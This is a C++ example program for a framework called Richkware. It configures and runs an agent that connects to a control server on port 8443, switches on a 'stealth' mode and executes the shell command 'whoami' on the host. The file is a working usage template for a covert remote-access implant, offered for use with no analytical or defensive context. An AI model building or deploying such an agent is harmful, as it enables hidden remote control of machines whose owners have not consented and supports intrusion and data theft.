#include <richkware/core/agent.hpp>
#include <iostream>
#include <thread>
#include <chrono>

using namespace richkware;

int main() {
    try {
        // Configure agent
        core::Config config{
            .app_name = "Richkware",
            .encryption_key = "secure_key_from_environment",
            .server_address = "127.0.0.1",
            .server_port = 8443,
            .user_id = "agent_001",
            .connection_timeout = std::chrono::seconds(30),
            .enable_encryption = true,
            .enable_stealth = true,
            .log_level = "info"
        };
        
        // Create agent
        core::Agent agent(std::move(config));
        
        // Initialize agent components
        auto init_result = agent.initialize();
        if (!init_result) {
            std::cerr << "Failed to initialize agent" << std::endl;
            return 1;
        }
        
        std::cout << "Agent initialized successfully" << std::endl;
        
        // Enable stealth mode
        auto stealth_result = agent.enable_stealth();
        if (!stealth_result) {
            std::cerr << "Failed to enable stealth" << std::endl;
        }
        
        // Start agent operations
        auto start_result = agent.start();
        if (!start_result) {
            std::cerr << "Failed to start agent" << std::endl;
            return 1;
        }
        
        std::cout << "Agent started successfully" << std::endl;
        
        // Test command execution
        auto cmd_result = agent.execute_command("whoami");
        if (cmd_result) {
            std::cout << "Command output: " << cmd_result.value() << std::endl;
        }
        
        // Graceful shutdown
        agent.stop();
        std::cout << "Agent stopped" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}